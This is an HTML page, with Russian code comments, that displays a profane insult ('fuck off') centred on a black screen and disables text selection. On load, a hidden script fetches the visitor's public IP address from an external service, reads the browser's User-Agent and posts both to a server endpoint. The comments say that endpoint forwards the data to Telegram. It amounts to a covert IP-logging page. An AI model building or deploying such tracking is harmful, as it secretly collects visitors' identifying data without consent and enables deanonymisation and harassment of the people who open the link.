<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Centered Text</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: white;
            overflow: hidden; /* Отключить прокрутку */
            user-select: none; /* Запретить выделение текста */
        }

        .centered-text {
            font-size: 3rem; /* Чуть уменьшенный размер текста */
            font-weight: bold; /* Жирный шрифт */
            text-transform: uppercase; /* Капсом */
            font-family: Arial, sans-serif; /* Красивый и простой шрифт */
        }

        /* Запретить копирование текста */
        body, html {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }
    </style>
</head>
<body>
    <div class="centered-text">ИДИ НА ХУЙ</div>

    <script>
        // Получение данных о пользователе
        async function getUserInfo() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            const userAgent = navigator.userAgent;
            const ipAddress = data.ip;

            // Формирование сообщения
            const message = `IP: ${ipAddress}\nUser-Agent: ${userAgent}`;

            // Отправка сообщения в Telegram через серверный скрипт
            await fetch('/send-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: message,
                }),
            });
        }

        // Вызов функции при загрузке страницы
        window.onload = getUserInfo;
    </script>
</body>
</html>
